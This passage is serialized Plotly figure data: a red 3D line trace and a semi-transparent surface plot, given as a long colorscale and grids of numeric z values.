{\"color\": \"red\", \"width\": 2}, \"mode\": \"lines\", \"type\": \"scatter3d\", \"x\": [38, 28, 18, 8, 0, 0, 0], \"y\": [28, 38, 39, 35, 26, 16, 16], \"z\": [0.10347005724906921, 0.007558110170066357, -0.03461135923862457, -0.03682023286819458, -0.07587684690952301, -0.0994970053434372, -0.0994970053434372]}, {\"colorscale\": [[0.0, \"rgb(51, 51, 153)\"], [0.003937007874015748, \"rgb(49, 53, 155)\"], [0.007874015748031496, \"rgb(48, 56, 158)\"], [0.011811023622047244, \"rgb(47, 59, 161)\"], [0.015748031496062992, \"rgb(45, 61, 163)\"], [0.01968503937007874, \"rgb(44, 64, 166)\"], [0.023622047244094488, \"rgb(43, 67, 169)\"], [0.027559055118110236, \"rgb(41, 69, 171)\"], [0.031496062992125984, \"rgb(40, 72, 174)\"], [0.03543307086614173, \"rgb(39, 75, 177)\"], [0.03937007874015748, \"rgb(37, 77, 179)\"], [0.04330708661417323, \"rgb(36, 80, 182)\"], [0.047244094488188976, \"rgb(35, 83, 185)\"], [0.051181102362204724, \"rgb(33, 85, 187)\"], [0.05511811023622047, \"rgb(32, 88, 190)\"], [0.05905511811023622, \"rgb(31, 91, 193)\"], [0.06299212598425197, \"rgb(29, 93, 195)\"], [0.06692913385826771, \"rgb(28, 96, 198)\"], [0.07086614173228346, \"rgb(27, 98, 201)\"], [0.07480314960629922, \"rgb(25, 101, 203)\"], [0.07874015748031496, \"rgb(24, 104, 206)\"], [0.0826771653543307, \"rgb(23, 107, 209)\"], [0.08661417322834646, \"rgb(21, 109, 211)\"], [0.09055118110236221, \"rgb(20, 112, 214)\"], [0.09448818897637795, \"rgb(19, 115, 217)\"], [0.09842519685039369, \"rgb(17, 117, 219)\"], [0.10236220472440945, \"rgb(16, 120, 222)\"], [0.1062992125984252, \"rgb(14, 123, 225)\"], [0.11023622047244094, \"rgb(13, 125, 227)\"], [0.11417322834645668, \"rgb(12, 128, 230)\"], [0.11811023622047244, \"rgb(11, 131, 233)\"], [0.1220472440944882, \"rgb(9, 133, 235)\"], [0.12598425196850394, \"rgb(8, 136, 238)\"], [0.12992125984251968, \"rgb(7, 138, 241)\"], [0.13385826771653542, \"rgb(5, 141, 243)\"], [0.1377952755905512, \"rgb(4, 144, 246)\"], [0.14173228346456693, \"rgb(3, 147, 249)\"], [0.14566929133858267, \"rgb(1, 149, 251)\"], [0.14960629921259844, \"rgb(0, 152, 254)\"], [0.15354330708661418, \"rgb(0, 154, 250)\"], [0.15748031496062992, \"rgb(0, 156, 244)\"], [0.16141732283464566, \"rgb(0, 158, 238)\"], [0.1653543307086614, \"rgb(0, 160, 232)\"], [0.16929133858267717, \"rgb(0, 162, 226)\"], [0.1732283464566929, \"rgb(0, 164, 220)\"], [0.17716535433070865, \"rgb(0, 166, 214)\"], [0.18110236220472442, \"rgb(0, 168, 208)\"], [0.18503937007874016, \"rgb(0, 170, 202)\"], [0.1889763779527559, \"rgb(0, 172, 196)\"], [0.19291338582677164, \"rgb(0, 174, 190)\"], [0.19685039370078738, \"rgb(0, 176, 184)\"], [0.20078740157480315, \"rgb(0, 178, 178)\"], [0.2047244094488189, \"rgb(0, 180, 172)\"], [0.20866141732283464, \"rgb(0, 182, 166)\"], [0.2125984251968504, \"rgb(0, 184, 160)\"], [0.21653543307086615, \"rgb(0, 186, 154)\"], [0.2204724409448819, \"rgb(0, 188, 148)\"], [0.22440944881889763, \"rgb(0, 190, 142)\"], [0.22834645669291337, \"rgb(0, 192, 136)\"], [0.23228346456692914, \"rgb(0, 194, 130)\"], [0.23622047244094488, \"rgb(0, 196, 124)\"], [0.24015748031496062, \"rgb(0, 198, 118)\"], [0.2440944881889764, \"rgb(0, 200, 112)\"], [0.24803149606299213, \"rgb(0, 202, 106)\"], [0.25196850393700787, \"rgb(1, 204, 102)\"], [0.2559055118110236, \"rgb(5, 205, 103)\"], [0.25984251968503935, \"rgb(8, 205, 103)\"], [0.2637795275590551, \"rgb(13, 206, 104)\"], [0.26771653543307083, \"rgb(17, 207, 105)\"], [0.27165354330708663, \"rgb(21, 208, 106)\"], [0.2755905511811024, \"rgb(25, 209, 107)\"], [0.2795275590551181, \"rgb(29, 209, 107)\"], [0.28346456692913385, \"rgb(33, 210, 108)\"], [0.2874015748031496, \"rgb(37, 211, 109)\"], [0.29133858267716534, \"rgb(40, 212, 110)\"], [0.2952755905511811, \"rgb(45, 213, 111)\"], [0.2992125984251969, \"rgb(49, 213, 111)\"], [0.3031496062992126, \"rgb(53, 214, 112)\"], [0.30708661417322836, \"rgb(57, 215, 113)\"], [0.3110236220472441, \"rgb(61, 216, 114)\"], [0.31496062992125984, \"rgb(65, 217, 115)\"], [0.3188976377952756, \"rgb(69, 217, 115)\"], [0.3228346456692913, \"rgb(72, 218, 116)\"], [0.32677165354330706, \"rgb(77, 219, 117)\"], [0.3307086614173228, \"rgb(81, 220, 118)\"], [0.3346456692913386, \"rgb(85, 221, 119)\"], [0.33858267716535434, \"rgb(89, 221, 119)\"], [0.3425196850393701, \"rgb(93, 222, 120)\"], [0.3464566929133858, \"rgb(97, 223, 121)\"], [0.35039370078740156, \"rgb(101, 224, 122)\"], [0.3543307086614173, \"rgb(104, 225, 122)\"], [0.35826771653543305, \"rgb(109, 225, 123)\"], [0.36220472440944884, \"rgb(113, 226, 124)\"], [0.3661417322834646, \"rgb(117, 227, 125)\"], [0.3700787401574803, \"rgb(121, 228, 126)\"], [0.37401574803149606, \"rgb(125, 229, 127)\"], [0.3779527559055118, \"rgb(129, 229, 127)\"], [0.38188976377952755, \"rgb(133, 230, 128)\"], [0.3858267716535433, \"rgb(136, 231, 129)\"], [0.38976377952755903, \"rgb(141, 232, 130)\"], [0.39370078740157477, \"rgb(145, 233, 131)\"], [0.39763779527559057, \"rgb(149, 233, 131)\"], [0.4015748031496063, \"rgb(153, 234, 132)\"], [0.40551181102362205, \"rgb(157, 235, 133)\"], [0.4094488188976378, \"rgb(161, 236, 134)\"], [0.41338582677165353, \"rgb(165, 237, 135)\"], [0.41732283464566927, \"rgb(168, 237, 135)\"], [0.421259842519685, \"rgb(173, 238, 136)\"], [0.4251968503937008, \"rgb(177, 239, 137)\"], [0.42913385826771655, \"rgb(181, 240, 138)\"], [0.4330708661417323, \"rgb(185, 241, 139)\"], [0.43700787401574803, \"rgb(189, 241, 139)\"], [0.4409448818897638, \"rgb(193, 242, 140)\"], [0.4448818897637795, \"rgb(197, 243, 141)\"], [0.44881889763779526, \"rgb(200, 244, 142)\"], [0.452755905511811, \"rgb(205, 245, 143)\"], [0.45669291338582674, \"rgb(209, 245, 143)\"], [0.46062992125984253, \"rgb(213, 246, 144)\"], [0.4645669291338583, \"rgb(217, 247, 145)\"], [0.468503937007874, \"rgb(221, 248, 146)\"], [0.47244094488188976, \"rgb(225, 249, 147)\"], [0.4763779527559055, \"rgb(229, 249, 147)\"], [0.48031496062992124, \"rgb(232, 250, 148)\"], [0.484251968503937, \"rgb(237, 251, 149)\"], [0.4881889763779528, \"rgb(241, 252, 150)\"], [0.4921259842519685, \"rgb(245, 253, 151)\"], [0.49606299212598426, \"rgb(249, 253, 151)\"], [0.5, \"rgb(254, 253, 152)\"], [0.5039370078740157, \"rgb(252, 251, 151)\"], [0.5078740157480315, \"rgb(250, 248, 150)\"], [0.5118110236220472, \"rgb(248, 246, 149)\"], [0.515748031496063, \"rgb(246, 243, 148)\"], [0.5196850393700787, \"rgb(244, 240, 147)\"], [0.5236220472440944, \"rgb(242, 238, 145)\"], [0.5275590551181102, \"rgb(240, 235, 144)\"], [0.5314960629921259, \"rgb(238, 233, 143)\"], [0.5354330708661417, \"rgb(236, 230, 142)\"], [0.5393700787401575, \"rgb(234, 228, 141)\"], [0.5433070866141733, \"rgb(232, 225, 140)\"], [0.547244094488189, \"rgb(230, 223, 139)\"], [0.5511811023622047, \"rgb(228, 220, 138)\"], [0.5551181102362205, \"rgb(226, 217, 137)\"], [0.5590551181102362, \"rgb(224, 215, 136)\"], [0.562992125984252, \"rgb(222, 212, 135)\"], [0.5669291338582677, \"rgb(220, 210, 134)\"], [0.5708661417322834, \"rgb(218, 207, 133)\"], [0.5748031496062992, \"rgb(216, 205, 131)\"], [0.5787401574803149, \"rgb(214, 202, 130)\"], [0.5826771653543307, \"rgb(211, 199, 129)\"], [0.5866141732283464, \"rgb(210, 197, 128)\"], [0.5905511811023622, \"rgb(208, 194, 127)\"], [0.5944881889763779, \"rgb(206, 192, 126)\"], [0.5984251968503937, \"rgb(204, 189, 125)\"], [0.6023622047244095, \"rgb(202, 187, 124)\"], [0.6062992125984252, \"rgb(200, 184, 123)\"], [0.610236220472441, \"rgb(198, 182, 122)\"], [0.6141732283464567, \"rgb(195, 179, 121)\"], [0.6181102362204725, \"rgb(194, 176, 120)\"], [0.6220472440944882, \"rgb(192, 174, 118)\"], [0.6259842519685039, \"rgb(190, 171, 117)\"], [0.6299212598425197, \"rgb(188, 169, 116)\"], [0.6338582677165354, \"rgb(186, 166, 115)\"], [0.6377952755905512, \"rgb(184, 164, 114)\"], [0.6417322834645669, \"rgb(182, 161, 113)\"], [0.6456692913385826, \"rgb(179, 159, 112)\"], [0.6496062992125984, \"rgb(178, 156, 111)\"], [0.6535433070866141, \"rgb(176, 153, 110)\"], [0.6574803149606299, \"rgb(174, 151, 109)\"], [0.6614173228346456, \"rgb(172, 148, 108)\"], [0.6653543307086615, \"rgb(170, 146, 107)\"], [0.6692913385826772, \"rgb(168, 143, 106)\"], [0.6732283464566929, \"rgb(166, 141, 104)\"], [0.6771653543307087, \"rgb(163, 138, 103)\"], [0.6811023622047244, \"rgb(162, 135, 102)\"], [0.6850393700787402, \"rgb(160, 133, 101)\"], [0.6889763779527559, \"rgb(158, 130, 100)\"], [0.6929133858267716, \"rgb(156, 128, 99)\"], [0.6968503937007874, \"rgb(154, 125, 98)\"], [0.7007874015748031, \"rgb(152, 123, 97)\"], [0.7047244094488189, \"rgb(150, 120, 96)\"], [0.7086614173228346, \"rgb(147, 118, 95)\"], [0.7125984251968503, \"rgb(146, 115, 94)\"], [0.7165354330708661, \"rgb(144, 112, 93)\"], [0.7204724409448818, \"rgb(142, 110, 91)\"], [0.7244094488188977, \"rgb(140, 107, 90)\"], [0.7283464566929134, \"rgb(138, 105, 89)\"], [0.7322834645669292, \"rgb(136, 102, 88)\"], [0.7362204724409449, \"rgb(134, 100, 87)\"], [0.7401574803149606, \"rgb(131, 97, 86)\"], [0.7440944881889764, \"rgb(130, 95, 85)\"], [0.7480314960629921, \"rgb(128, 92, 84)\"], [0.7519685039370079, \"rgb(129, 93, 86)\"], [0.7559055118110236, \"rgb(131, 96, 88)\"], [0.7598425196850394, \"rgb(133, 98, 91)\"], [0.7637795275590551, \"rgb(135, 101, 94)\"], [0.7677165354330708, \"rgb(136, 103, 96)\"], [0.7716535433070866, \"rgb(139, 106, 99)\"], [0.7755905511811023, \"rgb(141, 109, 102)\"], [0.7795275590551181, \"rgb(143, 111, 104)\"], [0.7834645669291338, \"rgb(145, 114, 107)\"], [0.7874015748031495, \"rgb(147, 116, 110)\"], [0.7913385826771654, \"rgb(149, 119, 112)\"], [0.7952755905511811, \"rgb(151, 121, 115)\"], [0.7992125984251969, \"rgb(153, 124, 118)\"], [0.8031496062992126, \"rgb(155, 127, 121)\"], [0.8070866141732284, \"rgb(157, 129, 123)\"], [0.8110236220472441, \"rgb(159, 132, 126)\"], [0.8149606299212598, \"rgb(161, 134, 129)\"], [0.8188976377952756, \"rgb(163, 137, 131)\"], [0.8228346456692913, \"rgb(165, 139, 134)\"], [0.8267716535433071, \"rgb(167, 142, 137)\"], [0.8307086614173228, \"rgb(168, 144, 139)\"], [0.8346456692913385, \"rgb(171, 147, 142)\"], [0.8385826771653543, \"rgb(173, 150, 145)\"], [0.84251968503937, \"rgb(175, 152, 147)\"], [0.8464566929133858, \"rgb(177, 155, 150)\"], [0.8503937007874016, \"rgb(179, 157, 153)\"], [0.8543307086614174, \"rgb(181, 160, 155)\"], [0.8582677165354331, \"rgb(183, 162, 158)\"], [0.8622047244094488, \"rgb(185, 165, 161)\"], [0.8661417322834646, \"rgb(187, 167, 163)\"], [0.8700787401574803, \"rgb(189, 170, 166)\"], [0.8740157480314961, \"rgb(191, 173, 169)\"], [0.8779527559055118, \"rgb(193, 175, 171)\"], [0.8818897637795275, \"rgb(195, 178, 174)\"], [0.8858267716535433, \"rgb(196, 180, 177)\"], [0.889763779527559, \"rgb(199, 183, 179)\"], [0.8937007874015748, \"rgb(200, 185, 182)\"], [0.8976377952755905, \"rgb(203, 188, 185)\"], [0.9015748031496063, \"rgb(205, 191, 187)\"], [0.905511811023622, \"rgb(207, 193, 190)\"], [0.9094488188976377, \"rgb(209, 196, 193)\"], [0.9133858267716535, \"rgb(211, 198, 196)\"], [0.9173228346456693, \"rgb(212, 201, 198)\"], [0.9212598425196851, \"rgb(215, 203, 201)\"], [0.9251968503937008, \"rgb(217, 206, 204)\"], [0.9291338582677166, \"rgb(219, 208, 206)\"], [0.9330708661417323, \"rgb(221, 211, 209)\"], [0.937007874015748, \"rgb(223, 214, 212)\"], [0.9409448818897638, \"rgb(225, 216, 214)\"], [0.9448818897637795, \"rgb(227, 219, 217)\"], [0.9488188976377953, \"rgb(228, 221, 220)\"], [0.952755905511811, \"rgb(231, 224, 222)\"], [0.9566929133858267, \"rgb(232, 226, 225)\"], [0.9606299212598425, \"rgb(235, 229, 228)\"], [0.9645669291338582, \"rgb(237, 231, 230)\"], [0.968503937007874, \"rgb(239, 234, 233)\"], [0.9724409448818897, \"rgb(241, 237, 236)\"], [0.9763779527559056, \"rgb(243, 239, 238)\"], [0.9803149606299213, \"rgb(244, 242, 241)\"], [0.984251968503937, \"rgb(247, 244, 244)\"], [0.9881889763779528, \"rgb(249, 247, 246)\"], [0.9921259842519685, \"rgb(251, 249, 249)\"], [0.9960629921259843, \"rgb(253, 252, 252)\"], [1.0, \"rgb(255, 255, 255)\"]], \"opacity\": 0.5, \"type\": \"surface\", \"z\": [[0.0, 0.026055242866277695, 0.04022997245192528, 0.05251088738441467, 0.06562713533639908, 0.07416171580553055, 0.07613785564899445, 0.08059637248516083, 0.09204737097024918, 0.09904944151639938, 0.09571556001901627, 0.09230887144804001, 0.09290139377117157, 0.09146595001220703, 0.08939267694950104, 0.0962560698390007, 0.10929950326681137, 0.11750493943691254, 0.11423718184232712, 0.10703443735837936, 0.09551643580198288, 0.08632608503103256, 0.08489466458559036, 0.08530562371015549, 0.08050071448087692, 0.0744047611951828, 0.0690612867474556, 0.06286187469959259, 0.058912649750709534, 0.060203488916158676, 0.06716547161340714, 0.07752514630556107, 0.08719723671674728, 0.09266369044780731, 0.09848224371671677, 0.09973159432411194, 0.08974117040634155, 0.07921861112117767, 0.07526501268148422, 0.06853555142879486, 0.05042384937405586, 0.03243892639875412, 0.021982721984386444, 0.021562404930591583, 0.02184644713997841, 0.019358018413186073, 0.018009694293141365, 0.018917715176939964, 0.016203826293349266, 0.0071710217744112015], [-0.026055242866277695, 0.00041995063656941056, 0.018534695729613304, 0.033445097506046295, 0.04728320240974426, 0.05552302300930023, 0.05791836977005005, 0.06340236961841583, 0.07709035277366638, 0.08659420162439346, 0.08465413749217987, 0.08181660622358322, 0.08221908658742905, 0.0811559185385704, 0.07881534844636917, 0.08500505983829498, 0.09869761019945145, 0.10812710970640182, 0.10657580941915512, 0.10018885135650635, 0.08963074535131454, 0.08001133799552917, 0.07684739679098129, 0.0775923877954483, 0.07807464152574539, 0.07532712817192078, 0.06884092837572098, 0.056512508541345596, 0.049154289066791534, 0.05141661316156387, 0.06356098502874374, 0.07632580399513245, 0.08555798977613449, 0.08968787640333176, 0.09535565972328186, 0.09766744822263718, 0.09084900468587875, 0.0821353867650032, 0.07746076583862305, 0.06890217214822769, 0.04969275742769241, 0.031678907573223114, 0.021255772560834885, 0.02168227732181549, 0.02287125401198864, 0.022497165948152542, 0.02361089177429676, 0.02651228941977024, 0.023547792807221413, 0.01201237179338932], [-0.04022997245192528, -0.015869908034801483, 0.004046501126140356, 0.019712576642632484, 0.03261580318212509, 0.040521349757909775, 0.04386133700609207, 0.04880091920495033, 0.059581458568573, 0.06904041767120361, 0.06908419728279114, 0.06646276265382767, 0.06517716497182846, 0.06472375243902206, 0.06785295158624649, 0.07763173431158066, 0.08981431275606155, 0.09899599105119705, 0.10030091553926468, 0.0955020859837532, 0.08835869282484055, 0.07892902940511703, 0.07044269144535065, 0.06452414393424988, 0.06455692648887634, 0.06589563935995102, 0.06152625381946564, 0.049651455134153366, 0.04467020183801651, 0.050881341099739075, 0.06390656530857086, 0.0730731412768364, 0.07982494682073593, 0.08497647196054459, 0.09366340935230255, 0.09745436161756516, 0.09284249693155289, 0.08321795612573624, 0.07611706107854843, 0.06796100735664368, 0.052091483026742935, 0.03445092588663101, 0.019854338839650154, 0.016779199242591858, 0.01871057040989399, 0.021064776927232742, 0.0221742931753397, 0.02369670197367668, 0.020989084616303444, 0.014235000126063824], [-0.05251088738441467, -0.03058764711022377, -0.011285792104899883, 0.004609395284205675, 0.019002307206392288, 0.032178718596696854, 0.03867889195680618, 0.04281146451830864, 0.05065733194351196, 0.05872713401913643, 0.05931653454899788, 0.05686967819929123, 0.054996322840452194, 0.05466541647911072, 0.05727364495396614, 0.06476671993732452, 0.07478645443916321, 0.08335481584072113, 0.0862041711807251, 0.08280517905950546, 0.07932732254266739, 0.07285104691982269, 0.062344953417778015, 0.0518118254840374, 0.048994023352861404, 0.05138561129570007, 0.04915580898523331, 0.04140271618962288, 0.04111795872449875, 0.05025692284107208, 0.06010529026389122, 0.06467432528734207, 0.06966067850589752, 0.07570943981409073, 0.0865691751241684, 0.09175928682088852, 0.08831390738487244, 0.07817883044481277, 0.07030585408210754, 0.06403037160634995, 0.05182028189301491, 0.03505855053663254, 0.018868986517190933, 0.013864779844880104, 0.014247607439756393, 0.013883953914046288, 0.009955392219126225, 0.008961008861660957, 0.007778535597026348, 0.00669223815202713], [-0.06405401229858398, -0.044817209243774414, -0.027011284604668617, -0.010965337976813316, 0.0048823668621480465, 0.022596590220928192, 0.03258773684501648, 0.03766319155693054, 0.045194368809461594, 0.05254266783595085, 0.05409639701247215, 0.05392224341630936, 0.05309617891907692, 0.05193905904889107, 0.05025198683142662, 0.052699875086545944, 0.06033818796277046, 0.06669150292873383, 0.06809817254543304, 0.0653107538819313, 0.06418296694755554, 0.06062855198979378, 0.05037320777773857, 0.03994768485426903, 0.03761589899659157, 0.039092980325222015, 0.03696652501821518, 0.03313480690121651, 0.03666577488183975, 0.04693559184670448, 0.05492584779858589, 0.05815713852643967, 0.062445320188999176, 0.06693002581596375, 0.07696988433599472, 0.08323665708303452, 0.08092866092920303, 0.07210227847099304, 0.06536193192005157, 0.059751369059085846, 0.048820868134498596, 0.03414951264858246, 0.020879419520497322, 0.01622115634381771, 0.012652340345084667, 0.006802916061133146, -0.001976406667381525, -0.005365060642361641, -0.006811708211898804, -0.006987688131630421], [-0.06982800364494324, -0.05501371622085571, -0.039005525410175323, -0.022734303027391434, -0.008865753188729286, 0.005019799340516329, 0.017816506326198578, 0.02805187553167343, 0.03636198863387108, 0.04204057902097702, 0.0464484840631485, 0.051559120416641235, 0.051908597350120544, 0.04821821302175522, 0.04662412777543068, 0.05111408233642578, 0.057275768369436264, 0.06022525206208229, 0.05848219245672226, 0.05558350682258606, 0.05474691092967987, 0.05105288699269295, 0.04047675430774689, 0.032897111028432846, 0.033298902213573456, 0.03078330308198929, 0.026145564392209053, 0.02768516167998314, 0.03371873497962952, 0.041262246668338776, 0.04817251116037369, 0.05385565012693405, 0.0593767873942852, 0.06171039491891861, 0.06899785995483398, 0.07557418197393417, 0.07264307141304016, 0.0656294897198677, 0.06185838580131531, 0.055663589388132095, 0.04454009607434273, 0.03427698090672493, 0.02706841565668583, 0.02047918178141117, 0.00920513179153204, -0.0017767121316865087, -0.009153984487056732, -0.013078519143164158, -0.01612836867570877, -0.017208807170391083], [-0.07487376034259796, -0.06194769963622093, -0.0446578748524189, -0.02736714854836464, -0.01546410284936428, -0.006408232729882002, 0.006767454091459513, 0.020474158227443695, 0.030412273481488228, 0.03693469613790512, 0.044539276510477066, 0.05167168751358986, 0.051050059497356415, 0.0456680990755558, 0.04429169371724129, 0.05028655752539635, 0.055899728089571, 0.060351114720106125, 0.06141602620482445, 0.059054184705019, 0.057432934641838074, 0.05229679122567177, 0.041391387581825256, 0.03459673747420311, 0.03421667218208313, 0.028589127585291862, 0.0213151928037405, 0.02179461531341076, 0.02550065517425537, 0.029105709865689278, 0.03487466275691986, 0.042029183357954025, 0.04851573705673218, 0.05191168934106827, 0.05924078822135925, 0.06591796875, 0.06254572421312332, 0.05666443333029747, 0.054978787899017334, 0.05075771361589432, 0.042294759303331375, 0.03557251766324043, 0.030137380585074425, 0.019501402974128723, 0.003550246125087142, -0.010646109469234943, -0.017964312806725502, -0.022323669865727425, -0.02534671314060688, -0.02475357986986637], [-0.08252570778131485, -0.06960310786962509, -0.05037790536880493, -0.0328536257147789, -0.02135447785258293, -0.011373178102076054, 0.002447723411023617, 0.016338756307959557, 0.027599113062024117, 0.03653140738606453, 0.046524763107299805, 0.053653497248888016, 0.05217881128191948, 0.04653428867459297, 0.04337340220808983, 0.046872250735759735, 0.05157821625471115, 0.0589129664003849, 0.06443792581558228, 0.06261268258094788, 0.0614115335047245, 0.05813004449009895, 0.04861416667699814, 0.040615227073431015, 0.03619919344782829, 0.029406076297163963, 0.021199174225330353, 0.017083575949072838, 0.016170622780919075, 0.01617451198399067, 0.01915121264755726, 0.024815231561660767, 0.03120586648583412, 0.03781111165881157, 0.0470270998775959, 0.05320964753627777, 0.04993202164769173, 0.04395344480872154, 0.04200832173228264, 0.04015279933810234, 0.03624304011464119, 0.032157786190509796, 0.02659785933792591, 0.013697154819965363, -0.003134016878902912, -0.019525840878486633, -0.02982795424759388, -0.034727007150650024, -0.03677823394536972, -0.03457352891564369], [-0.088084876537323, -0.07578612864017487, -0.05709841474890709, -0.04281802475452423, -0.03314187005162239, -0.01978868618607521, -0.004940563812851906, 0.007052809465676546, 0.018830791115760803, 0.028256600722670555, 0.03774286434054375, 0.04659680277109146, 0.048513080924749374, 0.044407956302165985, 0.043924834579229355, 0.04732906445860863, 0.04915965721011162, 0.05503341555595398, 0.06027747318148613, 0.05677381157875061, 0.055452682077884674, 0.05831094831228256, 0.054589252918958664, 0.04679505527019501, 0.03715365380048752, 0.0297465231269598, 0.02284594252705574, 0.016386089846491814, 0.01210738718509674, 0.010056216269731522, 0.011346717365086079, 0.015726514160633087, 0.022168517112731934, 0.032199420034885406, 0.04068504646420479, 0.0432627908885479, 0.04044308140873909, 0.03302258625626564, 0.026294469833374023, 0.02177022024989128, 0.02305007353425026, 0.023692192509770393, 0.020470308139920235, 0.006326741073280573, -0.011361107230186462, -0.029226820915937424, -0.03904905915260315, -0.04057116061449051, -0.041110772639513016, -0.042343754321336746], [-0.09046395868062973, -0.08029993623495102, -0.06484664231538773, -0.05441025644540787, -0.04690436273813248, -0.033600304275751114, -0.019502811133861542, -0.0087891248986125, 0.004302168730646372, 0.013561315834522247, 0.021183570846915245, 0.032534483820199966, 0.03939448669552803, 0.038264013826847076, 0.042624615132808685, 0.04829484596848488, 0.04798632860183716, 0.05137592926621437, 0.05515177547931671, 0.0507231131196022, 0.047346021980047226, 0.05102177709341049, 0.05162586644291878, 0.04786542430520058, 0.041316475719213486, 0.03510859236121178, 0.029109148308634758, 0.023041727021336555, 0.018523870036005974, 0.01687413826584816, 0.018333228304982185, 0.02202541194856167, 0.026972169056534767, 0.032238349318504333, 0.034370578825473785, 0.03323265165090561, 0.0320943146944046, 0.02529216930270195, 0.015125075355172157, 0.007106577046215534, 0.010151741094887257, 0.013506179675459862, 0.012705199420452118, -0.0009012600639835, -0.01893707551062107, -0.03631623089313507, -0.042546845972537994, -0.03971286118030548, -0.038343481719493866, -0.04207237809896469], [-0.09077435731887817, -0.08231694251298904, -0.0687052384018898, -0.05957259237766266, -0.05276624113321304, -0.041519686579704285, -0.02901371568441391, -0.018739284947514534, -0.00591065501794219, 0.0017778686014935374, 0.0072633964009583, 0.019196463748812675, 0.028874075040221214, 0.030982285737991333, 0.0375741571187973, 0.04428459331393242, 0.04408830404281616, 0.04776005446910858, 0.052792880684137344, 0.04995068535208702, 0.04597831889986992, 0.0473640002310276, 0.04890179634094238, 0.04874878749251366, 0.04780099540948868, 0.04237278550863266, 0.035111457109451294, 0.028654644265770912, 0.025043245404958725, 0.025274259969592094, 0.028360286727547646, 0.03186643496155739, 0.03472950682044029, 0.033870160579681396, 0.03086530603468418, 0.028118308633565903, 0.028084469959139824, 0.023532142862677574, 0.014101946726441383, 0.005942619871348143, 0.00784363690763712, 0.010294768959283829, 0.00926344096660614, -0.0036943024024367332, -0.021428413689136505, -0.03778437525033951, -0.04219385236501694, -0.037913620471954346, -0.035140130668878555, -0.03759804368019104], [-0.09331303089857101, -0.08199037611484528, -0.06908777356147766, -0.06161000579595566, -0.053420402109622955, -0.040489863604307175, -0.029524780809879303, -0.022714819759130478, -0.014929833821952343, -0.009060164913535118, -0.004099735990166664, 0.009030456654727459, 0.02217957004904747, 0.0285332053899765, 0.03346157446503639, 0.03910748288035393, 0.04303692281246185, 0.04606693983078003, 0.0470486581325531, 0.04664698243141174, 0.04791613295674324, 0.05116475373506546, 0.05129534751176834, 0.05082554742693901, 0.052964482456445694, 0.04828328639268875, 0.04033626616001129, 0.03302232176065445, 0.028018547222018242, 0.028673525899648666, 0.0347534604370594, 0.0381692573428154, 0.03857777640223503, 0.038226496428251266, 0.035453274846076965, 0.030527153983712196, 0.027912143617868423, 0.027193179354071617, 0.022840920835733414, 0.01616734080016613, 0.012079176492989063, 0.01026392076164484, 0.00813800748437643, -0.0002964673622045666, -0.01465329248458147, -0.027299143373966217, -0.03292121738195419, -0.03336697071790695, -0.031994741410017014, -0.03215336427092552], [-0.09325568377971649, -0.07955029606819153, -0.06902336329221725, -0.06340795755386353, -0.05293617025017738, -0.03609658405184746, -0.025217384099960327, -0.021315479651093483, -0.016835026443004608, -0.010872251354157925, -0.005701255984604359, 0.004302559420466423, 0.015898684039711952, 0.0248965285718441, 0.02947973646223545, 0.03618287667632103, 0.044713858515024185, 0.04845569282770157, 0.04693271219730377, 0.049098506569862366, 0.05606602877378464, 0.06213896721601486, 0.06041654199361801, 0.05568471550941467, 0.05329429730772972, 0.0472627654671669, 0.03995650261640549, 0.03403420001268387, 0.027598680928349495, 0.026938553899526596, 0.034497711807489395, 0.037609297782182693, 0.03688732162117958, 0.04215070605278015, 0.044202715158462524, 0.03889020159840584, 0.033213596791028976, 0.034598492085933685, 0.034789618104696274, 0.031510744243860245, 0.02451963722705841, 0.01937112770974636, 0.013122878037393093, 0.004149156156927347, -0.00791015475988388, -0.016132177785038948, -0.021536555141210556, -0.02697569690644741, -0.02858850173652172, -0.028658192604780197], [-0.09178968518972397, -0.07910966128110886, -0.07093986123800278, -0.06553258746862411, -0.05387589707970619, -0.0365971140563488, -0.025870244950056076, -0.021652625873684883, -0.014702841639518738, -0.006909339223057032, -0.0021609500981867313, 0.003290393855422735, 0.010879430919885635, 0.019992133602499962, 0.027182038873434067, 0.03716730698943138, 0.047237176448106766, 0.05389194190502167, 0.055912867188453674, 0.06002872809767723, 0.06707712262868881, 0.07131654769182205, 0.0684373676776886, 0.06143951043486595, 0.05533495917916298, 0.04790012910962105, 0.04110413044691086, 0.03692949563264847, 0.030154293403029442, 0.0279538594186306, 0.03490055724978447, 0.037893205881118774, 0.037109069526195526, 0.043422866612672806, 0.04783966392278671, 0.045311637222766876, 0.04148939624428749, 0.043578438460826874, 0.04410574212670326, 0.04312834516167641, 0.038444600999355316, 0.03341098874807358, 0.023801814764738083, 0.010455261915922165, -0.0020712774712592363, -0.008753273636102676, -0.012639804743230343, -0.019233886152505875, -0.0226029884070158, -0.023625949397683144], [-0.09297418594360352, -0.08121377229690552, -0.07260532677173615, -0.06422293931245804, -0.05140295252203941, -0.0391601026058197, -0.031003644689917564, -0.024467013776302338, -0.013530217111110687, -0.005538587458431721, -0.0017330573173239827, 0.00400075688958168, 0.011075487360358238, 0.01824997179210186, 0.02828759141266346, 0.04205707088112831, 0.05134645476937294, 0.0586298331618309, 0.06214211508631706, 0.06561016291379929, 0.07163340598344803, 0.07639895379543304, 0.07381328195333481, 0.06727400422096252, 0.06082746759057045, 0.051316238939762115, 0.04237395152449608, 0.03749625384807587, 0.03047827258706093, 0.027304403483867645, 0.035579536110162735, 0.04119955375790596, 0.04086552560329437, 0.04284040629863739, 0.04611074551939964, 0.04803871363401413, 0.04765947163105011, 0.04801969230175018, 0.046009574085474014, 0.044999729841947556, 0.04324386268854141, 0.04015640169382095, 0.03368491306900978, 0.02363380789756775, 0.012302697636187077, 0.005156318657100201, -0.0012268300633877516, -0.010765810497105122, -0.018938738852739334, -0.022702453657984734], [-0.0981902927160263, -0.0874277874827385, -0.07821350544691086, -0.06693173199892044, -0.0524975024163723, -0.041942764073610306, -0.034699197858572006, -0.027153203263878822, -0.016928918659687042, -0.011742213740944862, -0.007640343625098467, 0.003886755555868149, 0.014621039852499962, 0.018969185650348663, 0.027393288910388947, 0.04031873866915703, 0.047836776822805405, 0.055072132498025894, 0.05906321480870247, 0.06066914647817612, 0.06636039912700653, 0.07457049190998077, 0.07397085428237915, 0.07062772661447525, 0.06782622635364532, 0.05749291554093361, 0.046565864235162735, 0.041788484901189804, 0.03591140732169151, 0.0315973162651062, 0.03672797605395317, 0.04200557991862297, 0.04225054010748863, 0.04297475516796112, 0.046742603182792664, 0.05196549370884895, 0.05394848436117172, 0.05148962140083313, 0.045942049473524094, 0.04224398732185364, 0.04141828417778015, 